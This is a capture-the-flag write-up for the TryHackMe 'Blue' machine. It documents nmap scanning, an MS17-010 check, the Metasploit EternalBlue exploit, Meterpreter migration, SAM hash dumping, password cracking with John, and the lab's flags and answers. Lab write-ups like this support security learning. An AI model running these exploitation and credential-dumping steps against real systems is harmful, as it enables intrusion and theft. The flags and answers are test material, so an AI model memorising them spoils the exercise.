# TryHackMe - Blue

## General Information

- **Target Machine:** Blue
- **Target IP:** 10.65.163.160
- **Platform:** TryHackMe
- **Operating System:** Windows 7 Professional SP1 x64
- **Difficulty:** Easy
- **Objectives:** Reconnaissance, Initial Access, Privilege Escalation, Credential Cracking, and Flag Discovery.

---

## 1. Environment Setup

A structured directory layout was created to record logs, tool outputs, and findings:

```bash
mkdir -p ~/THM/Blue/{scans,notes,loot,exploit,screenshots}
touch ~/THM/Blue/notes/{notes.md,commands.md,findings.md}
cd ~/THM/Blue
script ~/THM/Blue/notes/terminal_session.log
```

---

## 2. Initial Reconnaissance

Because the target host may not respond to ICMP ping requests, `-Pn` was specified for all port scans.

### Initial Nmap Scan

```bash
sudo nmap -Pn -sV -sC 10.65.163.160 -oN ~/THM/Blue/scans/nmap_initial.nmap
```

### Scan Results

Open ports identified:

- `135/tcp` → `msrpc`
- `139/tcp` → `netbios-ssn`
- `445/tcp` → `microsoft-ds`
- `3389/tcp` → `tcpwrapped`
- `49152/tcp` → `msrpc`
- `49153/tcp` → `msrpc`
- `49154/tcp` → `msrpc`
- `49161/tcp` → `msrpc`

### Target System Identification

- **Hostname:** `JON-PC`
- **OS Version:** `Windows 7 Professional 7601 Service Pack 1`
- **Architecture:** `x64`
- **Workgroup:** `WORKGROUP`

### Analysis

The combination of Windows 7 SP1, exposed SMB on port 445, and unsigned SMB traffic strongly indicated susceptibility to **MS17-010 (EternalBlue)**.

---

## 3. Vulnerability Verification

To confirm the vulnerability, Nmap's SMB vulnerability NSE script was executed:

```bash
sudo nmap --script smb-vuln-ms17-010 -p445 10.65.163.160 -oN ~/THM/Blue/scans/nmap_ms17-010.nmap
```

### Result

The host was confirmed **VULNERABLE to MS17-010 (CVE-2017-0143)**.

---

## 4. Exploitation with Metasploit

Metasploit's EternalBlue exploit module was configured and launched:

```text
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.65.163.160
set LHOST 192.168.225.140
set VERIFY_ARCH true
set VERIFY_TARGET true
run
```

### Result

A **Meterpreter x64/windows** session was established with direct elevated privileges as:
- **`NT AUTHORITY\SYSTEM`**

---

## 5. Post-Exploitation & Session Migration

### Shell Conversion to Meterpreter

To fulfill the lab exercise requirement of converting a command shell to Meterpreter:

```text
background
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
sessions -i 2
```

### Process Migration

Process list was reviewed using `ps`, and the payload was migrated into a stable SYSTEM process:

```text
migrate 1292   # spoolsv.exe
```

---

## 6. Hash Dumping & Password Cracking

### Extracting SAM Hashes

```text
hashdump
```

Extracted hashes:
```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

### Cracking NTLM Hash with John the Ripper

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ~/THM/Blue/loot/hashes.txt
```

**Cracked Credential:**
- **Jon:** `alqfna22`

---

## 7. Flag Retrieval

### Flag 1 (System Root)
```cmd
type C:\flag1.txt
```
> `flag1{access_the_machine}`

### Flag 2 (SAM Database Storage Location)
```cmd
type C:\Windows\System32\config\flag2.txt
```
> `flag2{sam_database_elevated_access}`

### Flag 3 (Administrator User Documents)
```cmd
type C:\Users\Jon\Documents\flag3.txt
```
> `flag3{admin_documents_can_be_valuable}`

---

## 8. Summary of Answers

| Item | Value |
| :--- | :--- |
| **Vulnerability** | MS17-010 / EternalBlue (CVE-2017-0143) |
| **Exploit Module** | `exploit/windows/smb/ms17_010_eternalblue` |
| **Escalated User** | `NT AUTHORITY\SYSTEM` |
| **Cracked Password (Jon)** | `alqfna22` |
| **Flag 1** | `flag1{access_the_machine}` |
| **Flag 2** | `flag2{sam_database_elevated_access}` |
| **Flag 3** | `flag3{admin_documents_can_be_valuable}` |

---

## 9. Lessons Learned

1. **ICMP Filtering:** Always utilize `-Pn` when scanning Windows hosts that may drop ping probes.
2. **Legacy SMB Vulnerabilities:** Windows 7 systems missing MS17-010 security updates provide instant root/SYSTEM level compromise.
3. **Session Stability:** Migrating out of ephemeral processes into long-running core Windows services (`spoolsv.exe`, `lsass.exe`) is vital to maintain persistence during post-exploitation.
